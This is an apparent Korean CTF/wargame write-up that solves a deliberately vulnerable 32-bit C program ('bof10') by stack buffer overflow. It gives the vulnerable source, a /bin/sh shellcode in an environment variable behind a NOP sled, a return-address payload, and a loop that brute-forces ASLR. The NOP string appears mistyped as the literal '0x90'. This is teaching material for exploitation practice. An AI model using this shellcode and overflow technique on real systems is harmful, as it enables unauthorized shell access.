# bof10

<details>
<summary>bof10.c</summary>

```c
// AFTER => bof9.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#define BUF_SIZE 8

// ASLR ON
// STACK-PROTECTOR OFF
// STACK-EXECUTION ON

void vuln(char * arg) {
    char buf[BUF_SIZE];

    if (setreuid(1011, 1011)) {
        perror("setuid");
        exit(1);
    }
    if (setregid(1011, 1011)) {
        perror("setgid");
        exit(1);
    }
    strcpy(buf, arg);
    printf("Hello %s[%p]!\n", buf, buf);
    printf("(env:SHELLCODE -> %p)\n", getenv("SHELLCODE"));
}

int main(int argc, char *argv[]) {
    vuln(argv[1]);
    return 0;
}
```
</details>

다음 코드를 보면 함수 인자를 받아서 vuln함수에 넘기는 것을 볼 수 있다. 그리고 나머지는 bof8과 같다. 그럼 bof8처럼 환경변수를 설정하고 환경변수 주소를 ret에 덮어씌우면 되는지 확인을 해봤다.

![](./image/1.png)

실행시킬 때마다 주소값이 바뀌는 것을 확인할 수 있다. 따라서 다른 방법을 생각해보아야 한다.

주소값이 계속 바뀐다면 특정을 할 수 없기 때문에 nop을 이용해보자. ret에 nop이 존재하는 주소를 보낸다면 결국 nop을 타고 환경변수의 주소에 도달하게 되어 환경변수를 실행시킬 수 있을 것 같다.


다음과 같이 환경변수를 설정할 때 nop을 무진장 많이 넣어주자. 그러면 스택 구조상 환경변수가 저장되는 부분에는 수많은 nop이 존재한다. 그렇기 때문에 ret이 그 사이를 가리키게 된다면 SHELLCODE가 실행될 수 있다.

```
export SHELLCODE=`python -c "print '0x90' * 130000 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x
50\x53\x89\xe1\xb0\x0b\xcd\x80'"`

```

vuln을 실행 했을 때 esp(ret의 주소)

![](./image/4.png)

버퍼오버플로우에 취약한 strcpy를 실행할 때 disassemble. 32비트는 인자를 스택에다가 push하여 전달하고 call할때 pop을 하기때문에 첫번째 인자인 buf의 주소는 마지막에 push된 ebp - 0x10에 저장되어 있다.

![](./image/2.png)

ebp - 0x10 값과 두 ret과 buf 주소값의 차이

![](./image/3.png)


이를 통해서 다음과 같은 페이로드를 작성해보자. 마지막의 주소값은 처음 실행시켜보았을 때 나온 환경변수 SHELLCODE의 주소값이다.
```
./bof10 `python -c "print 'x' * 20 + '\x51\x88\xa9\xff'"`
```
당연히 안될 것이다. ~~만약 운이 엄청나게 좋았더라면 됬을것이다.~~

대충 메모리의 구조이다.(너무 못그려서 그냥 보고만 지나가자) 

[여기(day9)](https://github.com/ccss17/security-tutorial/tree/master/09-Exploit4)에 환경변수에 nop을 많이 넣어 임의의 주소값을 ret에 주게 될때 ret이 nop이 있는 곳을 가르킬 확률이 너무 잘 나와있다.

![](./image/5.png)

여튼 너무 낮은 확률이지만 어느정도 가능성이 있기때문에 무한 반복을 하다보면 언젠가는 얻어 걸릴 것이다.

```
while true; do ./bof10 `python -c "print 'x' * 20 + '\x51\x88\xa9\xff'"`; done
```

![](./image/nop.gif)


# bof11

<details>
<summary>bof11</summary>